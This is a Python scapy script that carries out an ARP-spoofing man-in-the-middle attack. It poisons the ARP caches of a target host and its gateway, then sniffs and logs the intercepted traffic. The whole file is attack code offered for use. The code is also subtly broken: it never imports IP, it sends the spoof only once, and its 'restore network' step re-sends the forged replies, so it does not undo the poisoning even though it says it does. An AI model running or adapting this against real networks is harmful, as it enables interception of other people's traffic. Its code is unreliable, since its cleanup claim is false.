from scapy.all import ARP, Ether, sniff, send, srp
import os
import time

# Define target
target_ip = "192.168.1.100"  # Target IP
gateway_ip = "192.168.1.1"  # Gateway IP

# Define the attacker's interface
interface = "eth0"  # Adjust the interface for your environment

# ARP Spoofing function
def arp_spoof(target_ip, gateway_ip, interface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    arp_response_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_response_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_response_to_target, verbose=False)
    send(arp_response_to_gateway, verbose=False)

# Get MAC address using ARP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = ether_frame/arp_request
    response, _ = srp(arp_request_packet, timeout=1, verbose=False)
    
    for _, rcv in response:
        return rcv[Ether].src

# Packet Sniffing and Interception
def packet_callback(packet):
    if packet.haslayer("IP"):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        print(f"Intercepted packet from {ip_src} to {ip_dst}")

        # You can inspect, modify or log packets here

# Start Sniffing
def start_sniffing():
    sniff(prn=packet_callback, store=0, iface=interface)

# Restore Network (Undo the attack)
def restore_network():
    print("[+] Restoring network to normal...")
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    arp_response_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_response_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_response_to_target, count=4, verbose=False)
    send(arp_response_to_gateway, count=4, verbose=False)

if __name__ == "__main__":
    try:
        print("[+] Starting MITM Attack...")
        arp_spoof(target_ip, gateway_ip, interface)
        start_sniffing()
    except KeyboardInterrupt:
        print("[+] Detected Ctrl + C ...")
        restore_network()
        print("[+] Attack stopped, network restored!")
